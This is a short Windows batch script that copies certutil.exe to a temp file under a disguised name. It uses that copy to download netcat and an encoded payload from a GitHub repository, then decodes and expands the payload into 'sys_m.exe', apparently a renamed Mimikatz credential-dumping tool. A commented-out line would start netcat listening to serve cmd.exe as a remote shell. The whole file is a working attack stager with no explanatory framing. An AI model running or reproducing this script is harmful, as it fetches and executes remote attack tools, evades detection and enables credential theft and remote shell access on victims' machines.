@echo on
copy %windir%\system32\certutil.exe %temp%\cr.tmp
%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe

rem %Temp%\nc.exe -nLvp 4466 -e cmd.exe

%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/mim.b %Temp%\mim.b
%temp%\cr.tmp -decode %Temp%\mim.b %Temp%\mim
expand %Temp%\mim %Temp%\sys_m.exe



